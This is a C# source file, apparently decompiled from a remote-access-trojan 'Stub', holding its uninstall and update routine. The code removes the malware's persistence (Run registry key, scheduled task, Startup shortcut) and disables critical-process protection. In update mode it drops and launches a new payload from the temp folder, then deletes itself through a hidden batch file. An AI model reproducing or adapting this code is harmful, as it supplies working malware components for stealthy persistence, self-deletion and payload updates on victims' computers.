using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub
{
	public class Uninstaller
	{
		public static void UNS(bool IsUpdate, string Str, byte[] B)
		{
			if (IsUpdate)
			{
				try
				{
					Str = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + Str);
					File.WriteAllBytes(Str, B);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				File.Delete(Settings.InstallDir + "\\" + Settings.InstallStr);
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.DeleteValue(Path.GetFileNameWithoutExtension(Settings.InstallStr), throwOnMissingValue: false);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "schtasks";
				processStartInfo.Arguments = "/delete /f  /tn \"" + Path.GetFileNameWithoutExtension(Settings.InstallStr) + "\"";
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				Process.Start(processStartInfo);
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				ProjectData.ClearProjectError();
			}
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(Settings.InstallStr) + ".lnk";
				if (File.Exists(path))
				{
					Helper.fileStream.Close();
					File.Delete(path);
				}
			}
			catch (Exception ex9)
			{
				ProjectData.SetProjectError(ex9);
				Exception ex10 = ex9;
				ProjectData.ClearProjectError();
			}
			ProcessCritical.CriticalProcesses_Disable();
			try
			{
				string text = Path.GetTempFileName() + ".bat";
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine("@echo off");
					streamWriter.WriteLine("timeout 3 > NUL");
					streamWriter.WriteLine("CD " + Application.get_StartupPath());
					streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.get_ExecutablePath()) + "\" /f /q");
					streamWriter.WriteLine("CD " + Path.GetTempPath());
					streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
				}
				if (IsUpdate)
				{
					try
					{
						Process.Start(Str);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = text;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.ErrorDialog = false;
				processStartInfo.UseShellExecute = false;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
				Environment.Exit(0);
			}
			catch (Exception ex11)
			{
				ProjectData.SetProjectError(ex11);
				Exception ex12 = ex11;
				ProjectData.ClearProjectError();
			}
		}
	}
}
